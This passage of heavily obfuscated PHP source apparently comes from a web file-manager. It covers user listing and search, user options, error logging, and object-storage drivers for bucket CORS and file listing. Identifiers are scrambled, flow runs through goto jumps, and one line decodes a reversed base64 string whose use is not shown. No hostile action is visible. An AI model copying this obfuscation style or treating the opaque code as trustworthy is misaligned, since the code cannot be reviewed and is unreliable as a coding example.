listByID($CŸ×âºÃ¶Ş) { $eŒ„Ò±øù =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$CŸ×âºÃ¶Ş) { return; } $F—™»®ˆñ = array($eŒ„Ò±øù[1443] => array($eŒ„Ò±øù[17], $CŸ×âºÃ¶Ş)); $Aì‚é–×™‰ = $this->where($F—™»®ˆñ)->select(); $this->_listDataApply($Aì‚é–×™‰); return $Aì‚é–×™‰; } public function listByGroup($b‡Ï‡™Àá³ = 0, $aì­„ØÄ = array()) { goto dòÙãØº¾µ; c‡…İµáŞ: $this->_listDataApply($aĞßì¸ÅÛª[$c’İƒŸô­Õ[363]]); return $aĞßì¸ÅÛª; goto b¿†‡´•¼; dòÙãØº¾µ: $c’İƒŸô­Õ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bÎŒ‘ã³ = $c’İƒŸô­Õ[43]; $cºÇë«Ãã = array(); goto eÕƒ“Ò¯¸Í; eÕƒ“Ò¯¸Í: if ($b‡Ï‡™Àá³) { $cºÇë«Ãã = array($c’İƒŸô­Õ[2565] => intval($b‡Ï‡™Àá³)); $bÎŒ‘ã³ = "\x4c\x45\106\x54\40\112\117\x49\x4e\40{$this->tablePrefix}\x75\163\145\x72\137\147\162\x6f\x75\x70\x20\x75\163\145\162\137\x67\x72\157\165\x70\40\157\156\x20\165\163\x65\x72\x2e\165\x73\145\x72\111\x44\x20\x3d\40\165\163\145\162\137\x67\x72\x6f\165\x70\x2e\x75\x73\145\162\x49\x44"; $a³à‹Ö‹æ› = Input::get($c’İƒŸô­Õ[416], null, $c’İƒŸô­Õ[43]) ? $c’İƒŸô­Õ[43] : $c’İƒŸô­Õ[2566]; } if (isset($aì­„ØÄ[$c’İƒŸô­Õ[698]])) { $cºÇë«Ãã[$c’İƒŸô­Õ[2567]] = $aì­„ØÄ[$c’İƒŸô­Õ[698]]; } $aĞßì¸ÅÛª = $this->_makeOrder($a³à‹Ö‹æ›)->field($c’İƒŸô­Õ[2568])->where($cºÇë«Ãã)->join($bÎŒ‘ã³)->selectPage(50); goto c‡…İµáŞ; b¿†‡´•¼: } private function _makeOrder($CÀ±„¾¼»Ä = '') { goto F†ïœ»ã´; bµ¹­–£æ×: $F˜Ÿ¿òïï¤ = Input::get($Aƒ–Ğƒà‹£[416], $Aƒ–Ğƒà‹£[17], $Aƒ–Ğƒà‹£[1434], $CçîÆÀì ¾); $E«ŞÚÃáÅÇ = Input::get($Aƒ–Ğƒà‹£[417], $Aƒ–Ğƒà‹£[17], $Aƒ–Ğƒà‹£[2194], array($Aƒ–Ğƒà‹£[2194], $Aƒ–Ğƒà‹£[413])); $E«ŞÚÃáÅÇ = $b—ÔìêÚ¬[$E«ŞÚÃáÅÇ]; goto A¾õ§Ã¹Û; A¾õ§Ã¹Û: $CÀ±„¾¼»Ä = $CÀ±„¾¼»Ä . "\165\163\x65\x72\x2e{$F˜Ÿ¿òïï¤}\x20{$E«ŞÚÃáÅÇ}\x2c\x20\x75\163\x65\162\x2e\165\x73\145\x72\x49\104\x20\141\163\143"; return $this->alias($Aƒ–Ğƒà‹£[2313])->order($CÀ±„¾¼»Ä); goto a´ÒÆÜ·•”; F†ïœ»ã´: $Aƒ–Ğƒà‹£ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $CçîÆÀì ¾ = array($Aƒ–Ğƒà‹£[1443], $Aƒ–Ğƒà‹£[38], $Aƒ–Ğƒà‹£[2100], $Aƒ–Ğƒà‹£[2072], $Aƒ–Ğƒà‹£[197]); $b—ÔìêÚ¬ = array($Aƒ–Ğƒà‹£[411] => $Aƒ–Ğƒà‹£[412], $Aƒ–Ğƒà‹£[413] => $Aƒ–Ğƒà‹£[414]); goto bµ¹­–£æ×; a´ÒÆÜ·•”: } public function listSearch($c–œªØ×µƒ) { goto CÏ×ÆŒÒ÷; f–œ‘¸«¤: if (!$CØ ´»„İ×) { $Fèç…½¹ê’ = array(); } if (isset($c–œªØ×µƒ[$EÌß†ªô[698]])) { $Fèç…½¹ê’[$EÌß†ªô[698]] = $c–œªØ×µƒ[$EÌß†ªô[698]]; } $dÓ³ğÍ¾ñ = $this->_makeOrder()->where($Fèç…½¹ê’)->selectPage(20); goto fÆÕ‚òâĞ•; Bèİ¨Ş¿Ú¦: $CØ ´»„İ× = str_replace($EÌß†ªô[2197], $EÌß†ªô[2198], trim($CØ ´»„İ×)); $Fèç…½¹ê’ = array($EÌß†ªô[38] => array($EÌß†ªô[760], "\45{$CØ ´»„İ×}\x25"), $EÌß†ªô[302] => array($EÌß†ªô[760], "\45{$CØ ´»„İ×}\x25"), $EÌß†ªô[2372] => array($EÌß†ªô[760], "\45{$CØ ´»„İ×}\x25"), $EÌß†ªô[920] => $EÌß†ªô[2199]); if (Input::check($CØ ´»„İ×, $EÌß†ªô[308])) { $Fèç…½¹ê’[$EÌß†ªô[1443]] = array($EÌß†ªô[760], "\45{$CØ ´»„İ×}\45"); $Fèç…½¹ê’[$EÌß†ªô[2549]] = array($EÌß†ªô[760], "\45{$CØ ´»„İ×}\45"); } goto f–œ‘¸«¤; F—®ªí­âÏ: return $dÓ³ğÍ¾ñ; goto dÀŠö¬î‚¶; CÏ×ÆŒÒ÷: $EÌß†ªô =& $_SERVER[çŞáÓæÚô‚Ô‡]; $CØ ´»„İ× = $c–œªØ×µƒ[$EÌß†ªô[2195]]; $B¼Ò‚Ù„” = isset($c–œªØ×µƒ[$EÌß†ªô[2196]]) ? $c–œªØ×µƒ[$EÌß†ªô[2196]] : !1; goto Bèİ¨Ş¿Ú¦; fÆÕ‚òâĞ•: if (!$dÓ³ğÍ¾ñ || count($dÓ³ğÍ¾ñ[$EÌß†ªô[363]]) < 5 && Input::check($CØ ´»„İ×, $EÌß†ªô[315])) { $AÆÍËãòæœ = $this->_searchFromMeta($EÌß†ªô[424], $CØ ´»„İ×, 10); $e“ ã‹ó®Ä = $this->_searchFromMeta($EÌß†ªô[425], $CØ ´»„İ×, 10); $CÄ˜äÔÎôå = array_merge($AÆÍËãòæœ, $e“ ã‹ó®Ä, $dÓ³ğÍ¾ñ[$EÌß†ªô[363]]); $dÓ³ğÍ¾ñ[$EÌß†ªô[363]] = array_unique_by_key($CÄ˜äÔÎôå, $EÌß†ªô[1443]); $dÓ³ğÍ¾ñ[$EÌß†ªô[360]][$EÌß†ªô[361]] = count($dÓ³ğÍ¾ñ[$EÌß†ªô[363]]); $dÓ³ğÍ¾ñ[$EÌß†ªô[360]][$EÌß†ªô[362]] = ceil($dÓ³ğÍ¾ñ[$EÌß†ªô[360]][$EÌß†ªô[361]] / $dÓ³ğÍ¾ñ[$EÌß†ªô[360]][$EÌß†ªô[358]]); } $this->_listDataApply($dÓ³ğÍ¾ñ[$EÌß†ªô[363]]); $this->_filterByGroup($dÓ³ğÍ¾ñ, $B¼Ò‚Ù„”); goto F—®ªí­âÏ; dÀŠö¬î‚¶: } private function _filterByGroup(&$e”áàæ—·Š, $cˆ”ÑË”Ÿƒ) { $FÓŒ×Êã ò =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$cˆ”ÑË”Ÿƒ) { return $e”áàæ—·Š; } foreach ($e”áàæ—·Š[$FÓŒ×Êã ò[363]] as $f ë’°÷‹˜ => &$A£ª³êù‰±) { $fŠĞ´ÄƒäÜ = array_to_keyvalue($A£ª³êù‰±[$FÓŒ×Êã ò[2283]], $FÓŒ×Êã ò[43], $FÓŒ×Êã ò[2114]); if (!in_array($cˆ”ÑË”Ÿƒ, $fŠĞ´ÄƒäÜ)) { unset($e”áàæ—·Š[$FÓŒ×Êã ò[363]][$f ë’°÷‹˜]); } } unset($A£ª³êù‰±); $e”áàæ—·Š[$FÓŒ×Êã ò[363]] = array_values($e”áàæ—·Š[$FÓŒ×Êã ò[363]]); $e”áàæ—·Š[$FÓŒ×Êã ò[360]] = array($FÓŒ×Êã ò[2347] => count($e”áàæ—·Š[$FÓŒ×Êã ò[363]]), $FÓŒ×Êã ò[2345] => $e”áàæ—·Š[$FÓŒ×Êã ò[360]][$FÓŒ×Êã ò[358]], $FÓŒ×Êã ò[2344] => 1, $FÓŒ×Êã ò[2346] => 1); } private function _searchFromMeta($F˜Èï†îõ„, $F‚¤ÏÌ‡Ş‚, $EÖØã„½¾•) { goto b êà—¥²; b êà—¥²: $B„ÙÊàà =& $_SERVER[çŞáÓæÚô‚Ô‡]; $F‚¤ÏÌ‡Ş‚ = strtolower($F‚¤ÏÌ‡Ş‚); $a–‚¥ø‘ç‚ = array($B„ÙÊàà[99] => $F˜Èï†îõ„, $B„ÙÊàà[368] => array($B„ÙÊàà[760], "\x25{$F‚¤ÏÌ‡Ş‚}\x25")); goto AÆ›è ğ ; dÉôÂ‚ˆÈô: $F¸˜ºÜğÍ = $this->where(array($B„ÙÊàà[1434] => array($B„ÙÊàà[17], $FÅİç¼é)))->select(); if (!$F¸˜ºÜğÍ) { return array(); } return $F¸˜ºÜğÍ; goto cæ£Í˜Ü·á; AÆ›è ğ : $FÅİç¼é = Model($B„ÙÊàà[2569])->where($a–‚¥ø‘ç‚)->limit($EÖØã„½¾•)->select(); if (!$FÅİç¼é) { return array(); } $FÅİç¼é = array_to_keyvalue($FÅİç¼é, $B„ÙÊàà[43], $B„ÙÊàà[1443]); goto dÉôÂ‚ˆÈô; cæ£Í˜Ü·á: } private function _listDataApplyItem($càïÔöª»†) { $C´êê‰Ú‰É = array($càïÔöª»†); $this->_listDataApply($C´êê‰Ú‰É); return $C´êê‰Ú‰É[0]; } private function _listDataApply(&$a½Áø†Ò”) { goto Bî«‡¦×çì; Bî«‡¦×çì: $eË„Ÿ‘‘íò =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$a½Áø†Ò”) { return; } array_remove_key($a½Áø†Ò”, $eË„Ÿ‘‘íò[808]); goto d‰í´¦ˆ¾·; d‰í´¦ˆ¾·: $fàƒÌÆ£áš = array_to_keyvalue($a½Áø†Ò”, $eË„Ÿ‘‘íò[43], $eË„Ÿ‘‘íò[1443]); $this->_listAppendGroup($a½Áø†Ò”, $fàƒÌÆ£áš); $this->_listAppendMeta($a½Áø†Ò”, $fàƒÌÆ£áš); goto dœİŞ½ñÓ´; dœİŞ½ñÓ´: $this->_listAppendSourceRoot($a½Áø†Ò”, $fàƒÌÆ£áš); goto DÏ±ØÈ¬„; DÏ±ØÈ¬„: } private function _listAppendSourceRoot(&$dçß‚÷³ï¼, $cÏö°™«œŠ) { goto B—®ĞÑÂ¤; B—®ĞÑÂ¤: $e½œ²Ü¢í =& $_SERVER[çŞáÓæÚô‚Ô‡]; $a¼­ò§â× = array($e½œ²Ü¢í[472] => 0, $e½œ²Ü¢í[380] => SourceModel::TYPE_USER, $e½œ²Ü¢í[467] => array($e½œ²Ü¢í[17], $cÏö°™«œŠ)); $b…ŠÇ®” = $e½œ²Ü¢í[2206]; goto fÁí„¬é¥ö; e¬ŞÁ‡¨ç: foreach ($dçß‚÷³ï¼ as &$c“Ğè—ˆ…é) { $c“Ğè—ˆ…é[$e½œ²Ü¢í[400]] = $EÖ¥ÎÙíÆ´[$c“Ğè—ˆ…é[$e½œ²Ü¢í[1443]]] ? $EÖ¥ÎÙíÆ´[$c“Ğè—ˆ…é[$e½œ²Ü¢í[1443]]] : array(); } unset($c“Ğè—ˆ…é); goto fîàßåÇÕ; fÁí„¬é¥ö: $EÖ¥ÎÙíÆ´ = Model($e½œ²Ü¢í[761])->order($e½œ²Ü¢í[2207])->field($b…ŠÇ®”)->where($a¼­ò§â×)->select(); $EÖ¥ÎÙíÆ´ = array_to_keyvalue($EÖ¥ÎÙíÆ´, $e½œ²Ü¢í[467]); $EÖ¥ÎÙíÆ´ = array_remove_key($EÖ¥ÎÙíÆ´, $e½œ²Ü¢í[467]); goto e¬ŞÁ‡¨ç; fîàßåÇÕ: } private function _listAppendGroup(&$c®ÑäÒÚĞÇ, $E­›´ï¯) { goto Fš“´ÚÎ©ª; c†ñÕø–Ë: foreach ($c®ÑäÒÚĞÇ as &$f‡›œ¨î) { $f‡›œ¨î[$aĞ¡ùáâêª[2283]] = array(); if (isset($fÀ”¨¦ŸÔù[$f‡›œ¨î[$aĞ¡ùáâêª[1443]]])) { $f‡›œ¨î[$aĞ¡ùáâêª[2283]] = $fÀ”¨¦ŸÔù[$f‡›œ¨î[$aĞ¡ùáâêª[1443]]]; } } unset($f‡›œ¨î); goto D¼µº¿×; e©®ò¨¶ Ë: $aÜĞÙº¡¦½ = array_to_keyvalue($fÀ”¨¦ŸÔù, $aĞ¡ùáâêª[43], $aĞ¡ùáâêª[2114]); $aÜĞÙº¡¦½ = array_remove_value(array_unique($aÜĞÙº¡¦½), $aĞ¡ùáâêª[479]); if (!$aÜĞÙº¡¦½ || !$fÀ”¨¦ŸÔù) { return; } goto e„¨ÔÕƒÏÆ; F£Û¥åèÅ: $fÀ”¨¦ŸÔù = array_to_keyvalue_group($fÀ”¨¦ŸÔù, $aĞ¡ùáâêª[1443]); foreach ($fÀ”¨¦ŸÔù as &$E®àÃ¡ïŸÓ) { $bÉáë¤…èÁ = array(); foreach ($E®àÃ¡ïŸÓ as $BæŒ±Š¾®) { if (!$BæŒ±Š¾®[$aĞ¡ùáâêª[2258]]) { continue; } $E¨ñ„©îå§ = Model($aĞ¡ùáâêª[2277])->listData($BæŒ±Š¾®[$aĞ¡ùáâêª[2258]]); $bÉáë¤…èÁ[] = array($aĞ¡ùáâêª[2114] => $BæŒ±Š¾®[$aĞ¡ùáâêª[2114]], $aĞ¡ùáâêª[2571] => $Aœ™àµ™¿’[$BæŒ±Š¾®[$aĞ¡ùáâêª[2114]]][$aĞ¡ùáâêª[38]], $aĞ¡ùáâêª[470] => $Aœ™àµ™¿’[$BæŒ±Š¾®[$aĞ¡ùáâêª[2114]]][$aĞ¡ùáâêª[470]], $aĞ¡ùáâêª[385] => $E¨ñ„©îå§); } $E®àÃ¡ïŸÓ = $bÉáë¤…èÁ; } unset($E®àÃ¡ïŸÓ); goto c†ñÕø–Ë; Fš“´ÚÎ©ª: $aĞ¡ùáâêª =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bƒ½¯®¬¿¹ = array($aĞ¡ùáâêª[1443] => array($aĞ¡ùáâêª[17], $E­›´ï¯)); $fÀ”¨¦ŸÔù = Model($aĞ¡ùáâêª[2193])->where($bƒ½¯®¬¿¹)->select(); goto e©®ò¨¶ Ë; e„¨ÔÕƒÏÆ: $bƒ½¯®¬¿¹ = array($aĞ¡ùáâêª[2114] => array($aĞ¡ùáâêª[17], $aÜĞÙº¡¦½)); $Aœ™àµ™¿’ = Model($aĞ¡ùáâêª[2281])->field($aĞ¡ùáâêª[2570])->where($bƒ½¯®¬¿¹)->select(); $Aœ™àµ™¿’ = array_to_keyvalue($Aœ™àµ™¿’, $aĞ¡ùáâêª[2114]); goto F£Û¥åèÅ; D¼µº¿×: } private function _listAppendMeta(&$d¸°¦â‚áÜ, $C‰£ÙÍŠ‘°) { goto céôàÜ¨®ƒ; DÀ‚â¶è: foreach ($d¸°¦â‚áÜ as &$D±‹°êôí”) { $f‚ÑÇÕŸ½ = array(); if (isset($déÔà¨¡Õô[$D±‹°êôí”[$CÆªÚ £óÑ[1443]]])) { $f‚ÑÇÕŸ½ = $déÔà¨¡Õô[$D±‹°êôí”[$CÆªÚ £óÑ[1443]]]; } $D±‹°êôí”[$CÆªÚ £óÑ[2573]] = array(); if (isset($f‚ÑÇÕŸ½[$Cœ¸ ÖÎŒ])) { $D±‹°êôí”[$CÆªÚ £óÑ[2573]] = $A³ù„¡©ƒ->getUserJobInfo($f‚ÑÇÕŸ½[$Cœ¸ ÖÎŒ]); } } unset($D±‹°êôí”); goto a±ÓÂÓ; Bë±ä¡à…†: foreach ($déÔà¨¡Õô as &$a Çæ¿‰ğ¹) { $EîŒè–ÉÌÓ = array(); foreach ($a Çæ¿‰ğ¹ as $A×Éàæö) { if (!in_array($A×Éàæö[$CÆªÚ £óÑ[99]], $bÎè…õ¡Ô)) { $EîŒè–ÉÌÓ[$A×Éàæö[$CÆªÚ £óÑ[99]]] = $A×Éàæö[$CÆªÚ £óÑ[368]]; } } $a Çæ¿‰ğ¹ = $EîŒè–ÉÌÓ; } unset($a Çæ¿‰ğ¹); $A³ù„¡©ƒ = Model($CÆªÚ £óÑ[2572]); goto DÀ‚â¶è; céôàÜ¨®ƒ: $CÆªÚ £óÑ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Cœ¸ ÖÎŒ = UserJobModel::JOB_KEY; $bÎè…õ¡Ô = array($CÆªÚ £óÑ[2551]); goto Fö„ˆæ±”; Fö„ˆæ±”: $Fçåòà‰ = array($CÆªÚ £óÑ[1443] => array($CÆªÚ £óÑ[17], $C‰£ÙÍŠ‘°)); $déÔà¨¡Õô = Model($CÆªÚ £óÑ[2548])->where($Fçåòà‰)->select(); $déÔà¨¡Õô = array_to_keyvalue_group($déÔà¨¡Õô, $CÆªÚ £óÑ[1443]); goto Bë±ä¡à…†; a±ÓÂÓ: } protected function groupUserAll($döêóäÜ¢’) { $Có‡ª«¼Ï =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$döêóäÜ¢’) { return !1; } $FŒÆó„Áƒ´ = Model($Có‡ª«¼Ï[2193])->field($Có‡ª«¼Ï[1443])->where(array($Có‡ª«¼Ï[2114] => array($Có‡ª«¼Ï[17], $döêóäÜ¢’)))->select(); $FŒÆó„Áƒ´ = array_to_keyvalue($FŒÆó„Áƒ´, $Có‡ª«¼Ï[43], $Có‡ª«¼Ï[1443]); return array_unique($FŒÆó„Áƒ´); } public function userSearch($eÀ´“¾ Î, $dĞ»¾Œ«Áå = "\x2a") { return Model($_SERVER[çŞáÓæÚô‚Ô‡][488])->where($eÀ´“¾ Î)->field($dĞ»¾Œ«Áå)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\145\x72\x5f\x6f\160\x74\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($d¾£Ï»²ºî) { $bŠõ¾ËºÙÜ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!defined($bŠõ¾ËºÙÜ[436])) { define($bŠõ¾ËºÙÜ[436], 0); } return "\x55\163\145\x72\117\160\x74\151\157\156\x5f{$d¾£Ï»²ºî}\x5f" . USER_ID; } protected function filterWhere($FÆÊÛäÌ) { $Cñìß¨ôÁì =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!defined($Cñìß¨ôÁì[436])) { define($Cñìß¨ôÁì[436], 0); } $FÆÊÛäÌ[$Cñìß¨ôÁì[1443]] = USER_ID; return $FÆÊÛäÌ; } public function cacheRemoveUser($e‡—÷ÃÁç¥, $A­ÁÃµä˜) { return Cache::remove("\125\163\x65\x72\x4f\x70\164\151\x6f\x6e\x5f{$e‡—÷ÃÁç¥}\137" . $A­ÁÃµä˜); } protected function optionDefault($e™åÓ¹ãì = '') { $eÇõäİÌÖ½ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($e™åÓ¹ãì == $eÇõäİÌÖ½[43]) { return $GLOBALS[$eÇõäİÌÖ½[16]][$eÇõäİÌÖ½[2574]]; } if ($e™åÓ¹ãì == $eÇõäİÌÖ½[2575]) { return $GLOBALS[$eÇõäİÌÖ½[16]][$eÇõäİÌÖ½[2576]]; } } } goto E³Ûöõå´®; E’Æç‘­ñˆ: function beforeShutdownError($cÑ¤ŸÍà…¢ = false, $FÛø³’˜ÄÑ = '', $CÈö‹ñ»Ö‚ = '', $bØÔïÅš = 0) { $Cİ»ˆšÎ›ò =& $_SERVER[·ü]; switch ($cÑ¤ŸÍà…¢) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $FÜ—»Æ½ù = $Cİ»ˆšÎ›ò[35]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $FÜ—»Æ½ù = $Cİ»ˆšÎ›ò[36]; break; case E_STRICT: $FÜ—»Æ½ù = $Cİ»ˆšÎ›ò[37]; break; case E_NOTICE: case E_USER_NOTICE: $FÜ—»Æ½ù = $Cİ»ˆšÎ›ò[38]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $FÜ—»Æ½ù = $Cİ»ˆšÎ›ò[39]; break; default: break; } if (!$FÜ—»Æ½ù || $FÜ—»Æ½ù == $Cİ»ˆšÎ›ò[38] || $FÜ—»Æ½ù == $Cİ»ˆšÎ›ò[39]) { return; } $CÈö‹ñ»Ö‚ = $Cİ»ˆšÎ›ò[4] . str_replace($_SERVER[$Cİ»ˆšÎ›ò[33]], $Cİ»ˆšÎ›ò[16], $CÈö‹ñ»Ö‚); $d…¨¼ ù¯Ï = $FÜ—»Æ½ù . $Cİ»ˆšÎ›ò[40] . $FÛø³’˜ÄÑ . $Cİ»ˆšÎ›ò[40] . $CÈö‹ñ»Ö‚ . $Cİ»ˆšÎ›ò[40] . $bØÔïÅš; write_log($d…¨¼ ù¯Ï . $Cİ»ˆšÎ›ò[41] . get_caller_msg(1), $Cİ»ˆšÎ›ò[15]); } $_SERVER[$_SERVER[·ü][42]] = $_SERVER[$_SERVER[·ü][33]] . $_SERVER[·ü][43]; $cŠ½’åì ‘ = strrev(base64_decode($_SERVER[·ü][44])); goto CÄ––Ú£ğì; d ÙÁ°œÒõ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($d²àÑÒ‘ìô) { parent::__construct($d²àÑÒ‘ìô); $this->signatureVersion($_SERVER[çŞáÓæÚô‚Ô‡][210]); } public function fileOutLink($A’åµåÂŒ) { $c‰Œ÷Şš =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (substr($A’åµåÂŒ, 0, 7) == $c‰Œ÷Şš[1122]) { $A’åµåÂŒ = $c‰Œ÷Şš[1123] . substr($A’åµåÂŒ, 7); } header($c‰Œ÷Şš[166] . $A’åµåÂŒ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($D§†ã¡…ò„) { parent::__construct(); include_once SDK_DIR . $_SERVER[çŞáÓæÚô‚Ô‡][1178]; $this->_init($D§†ã¡…ò„); } public function _init($E‰½¦æÙ¡Ğ) { foreach ($E‰½¦æÙ¡Ğ as $Bî¨ïâÜ¹¸ => $EÒ…Áóê±) { if (isset($this->{$Bî¨ïâÜ¹¸})) { $this->{$Bî¨ïâÜ¹¸} = $EÒ…Áóê±; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[çŞáÓæÚô‚Ô‡][1179], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto A¦ ÇÍìøä; C“Ş¹»ˆ‚‰: $c‚¥Ğ­äØ->addAllowedOrigin($D‡©×™Ğœ÷[1180]); $c‚¥Ğ­äØ->addAllowedMethod($D‡©×™Ğœ÷[1181]); $c‚¥Ğ­äØ->addAllowedMethod($D‡©×™Ğœ÷[1182]); goto EİŠ±£«Ó; fÒ‰­ËŠÜ: $c‚¥Ğ­äØ->setMaxAgeSeconds(600); $c‚¥Ğ­äØ->addExposeHeader($D‡©×™Ğœ÷[1185]); $c‚¥Ğ­äØ->addAllowedHeader($D‡©×™Ğœ÷[1180]); goto c¬ìÑ¾•²; EİŠ±£«Ó: $c‚¥Ğ­äØ->addAllowedMethod($D‡©×™Ğœ÷[1183]); $c‚¥Ğ­äØ->addAllowedMethod($D‡©×™Ğœ÷[1184]); $c‚¥Ğ­äØ->addAllowedMethod($D‡©×™Ğœ÷[165]); goto fÒ‰­ËŠÜ; c¬ìÑ¾•²: $D…éµšÖ×->addRule($c‚¥Ğ­äØ); try { $this->client->putBucketCors($this->bucket, $D…éµšÖ×); } catch (OSS\Core\OssException $Bó†Õç™Ÿ‘) { return !1; } return !0; goto cøŸÉã¶Ñº; A¦ ÇÍìøä: $D‡©×™Ğœ÷ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $D…éµšÖ× = new OSS\Model\CorsConfig(); $c‚¥Ğ­äØ = new OSS\Model\CorsRule(); goto C“Ş¹»ˆ‚‰; cøŸÉã¶Ñº: } public function getBucketCors() { goto fÔ¼š’¦¿; e²¿¢ÁÛ¬ì: $D‡Ø›¸µËê = $dæË‹¹áâø[0]->getMaxAgeSeconds(); $cÙÇÉÕô = $dæË‹¹áâø[0]->getExposeHeaders(); $eå‡Ë­Ò’ = $dæË‹¹áâø[0]->getAllowedHeaders(); goto C”àò¿‹×î; FÃßÆÜë¶: if (!$B›¹‘ß¯Àô || !($dæË‹¹áâø = $B›¹‘ß¯Àô->getRules())) { return null; } $F÷ìÇ¶ùÁ = $dæË‹¹áâø[0]->getAllowedOrigins(); $d¦¯¼óÒ¸£ = $dæË‹¹áâø[0]->getAllowedMethods(); goto e²¿¢ÁÛ¬ì; fÔ¼š’¦¿: $a¾ä™Øš¾Ò =& $_SERVER[çŞáÓæÚô‚Ô‡]; $B›¹‘ß¯Àô = null; try { $B›¹‘ß¯Àô = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $D¼…æªïíğ) { return null; } goto FÃßÆÜë¶; C”àò¿‹×î: return array($a¾ä™Øš¾Ò[185] => isset($F÷ìÇ¶ùÁ[0]) ? $F÷ìÇ¶ùÁ[0] : $a¾ä™Øš¾Ò[43], $a¾ä™Øš¾Ò[189] => $d¦¯¼óÒ¸£, $a¾ä™Øš¾Ò[1186] => $D‡Ø›¸µËê, $a¾ä™Øš¾Ò[1187] => isset($cÙÇÉÕô[0]) ? $cÙÇÉÕô[0] : $a¾ä™Øš¾Ò[43], $a¾ä™Øš¾Ò[187] => isset($eå‡Ë­Ò’[0]) ? $eå‡Ë­Ò’[0] : $a¾ä™Øš¾Ò[43]); goto Dß¾Û…Åª; Dß¾Û…Åª: } public function isBucketCors() { goto D‘ˆ˜²šŠŸ; føêÕåÜÉŒ: $eğ¦„¬¼ô² = array($eÙæÎ‡ö‡[190], $eÙæÎ‡ö‡[191], $eÙæÎ‡ö‡[192], $eÙæÎ‡ö‡[193], $eÙæÎ‡ö‡[194]); $fé©ğµ“í¿ = array_diff($eğ¦„¬¼ô², $a’¥ö—„Ç‡); return empty($fé©ğµ“í¿); goto fØ†÷¥Âƒ„; b¶Úã›¢: if ($BÌ„³°‡Óé[$eÙæÎ‡ö‡[185]] != $eÙæÎ‡ö‡[186] || $BÌ„³°‡Óé[$eÙæÎ‡ö‡[187]] != $eÙæÎ‡ö‡[186]) { return !1; } $a’¥ö—„Ç‡ = array_map($eÙæÎ‡ö‡[188], $BÌ„³°‡Óé[$eÙæÎ‡ö‡[189]]); if (!is_array($a’¥ö—„Ç‡)) { $a’¥ö—„Ç‡ = array(); } goto føêÕåÜÉŒ; D‘ˆ˜²šŠŸ: $eÙæÎ‡ö‡ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $BÌ„³°‡Óé = $this->getBucketCors(); if (!$BÌ„³°‡Óé || !is_array($BÌ„³°‡Óé)) { return !1; } goto b¶Úã›¢; fØ†÷¥Âƒ„: } public function mkfile($dá’Ğ ĞÖ°, $eâÇ‰ÚÚËö = '', $DÚ®«àà„è = REPEAT_RENAME) { $f¦Ï¥Ë¦­À = $this->setContent($dá’Ğ ĞÖ°, $eâÇ‰ÚÚËö); if ($f¦Ï¥Ë¦­À !== !1) { return $this->getPathOuter($dá’Ğ ĞÖ°); } return !1; } public function mkdir($EÀ³ĞÁ¼¼‹, $FË¬Ó†øÎ« = REPEAT_SKIP) { if ($this->_isFolder($EÀ³ĞÁ¼¼‹)) { return $this->getPathOuter($EÀ³ĞÁ¼¼‹); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($EÀ³ĞÁ¼¼‹)); } catch (OSS\Core\OssException $dÁ¦ø”Â”µ) { return !1; } return $this->getPathOuter($EÀ³ĞÁ¼¼‹); } private function fileList($BÙÂ»¦ŸŠ, $D‡Î‚Ú×†Š = '', $bª‹×¾ª… = 0) { goto EºÓ°œ¥¢£; EºÓ°œ¥¢£: $aã«½«„ˆù =& $_SERVER[çŞáÓæÚô‚Ô‡]; $BÙÂ»¦ŸŠ = trim($BÙÂ»¦ŸŠ, $aã«½«„ˆù[18]); $fñ¥™ëØ‰² = empty($BÙÂ»¦ŸŠ) ? $aã«½«„ˆù[43] : $BÙÂ»¦ŸŠ . $aã«½«„ˆù[18]; goto c ŠÛ¼×Éò; c ŠÛ¼×Éò: $A³‘ĞÁíè = $aã«½«„ˆù[43]; $fƒøŠª‰“º = 1000; $C¨ì‹÷­óñ = $DÊÖ„‰Üƒ° = array(); goto Cİ¡¢ğ”©; Cİ¡¢ğ”©: while (!0) { $FŸ²¹ãØäº = array($aã«½«„ˆù[1188] => $D‡Î‚Ú×†Š, $aã«½«„ˆù[196] => $fñ¥™ëØ‰², $aã«½«„ˆù[1189] => $fƒøŠª‰“º, $aã«½«„ˆù[1190] => $A³‘ĞÁíè); try { $dùÉ³ïˆäÁ = $this->client->listObjects($this->bucket, $FŸ²¹ãØäº); } catch (OSS\Core\OssException $aÊ¹’Ç¢Íõ) { break; } $A³‘ĞÁíè = $dùÉ³ïˆäÁ->getNextMarker(); $e¯©‡Õöİ· = $dùÉ³ïˆäÁ->getObjectList(); $e¦‰ĞàÛÏ = $dùÉ³ïˆäÁ->getPrefixList(); foreach ($e¯©‡Õöİ· as $d“²õ›»“) { if ($d“²õ›»“->getKey() == $fñ¥™ëØ‰²) { continue; } $Dš ¡§éêõ = $d“²õ›»“->getKey(); if ($bª‹×¾ª…) { $Dš ¡§éêõ = 